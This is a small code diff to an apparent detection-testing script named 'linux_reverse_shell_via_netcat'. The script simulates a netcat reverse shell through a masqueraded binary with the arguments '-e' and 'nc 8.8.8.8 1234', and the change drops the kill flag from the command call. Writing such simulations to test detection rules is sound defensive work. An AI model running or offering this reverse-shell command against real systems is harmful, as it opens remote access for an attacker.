@@ -10,6 +10,7 @@ from . import OSType, RuleMetadata, _common, register_code_rta
 
 log = logging.getLogger(__name__)
 
+
 @register_code_rta(
     id="ecb34b55-2947-48af-b746-3a472abfda43",
     name="linux_reverse_shell_via_netcat",
@@ -27,7 +28,7 @@ def main() -> None:
     _ = _common.execute_command(["chmod", "+x", masquerade])
     commands = [masquerade, "chain", "-h", "8.8.8.8", "-p", "1234", "-c", "-e", "nc 8.8.8.8 1234"]
     log.info("Simulating reverse shell activity..")
-    _ = _common.execute_command([*commands], timeout_secs=5, kill=True, shell=True)  # noqa: S604
+    _ = _common.execute_command([*commands], timeout_secs=5, shell=True)  # noqa: S604
     log.info("Reverse shell simulation successful!")
     log.info("Cleaning...")
     _common.remove_file(masquerade)
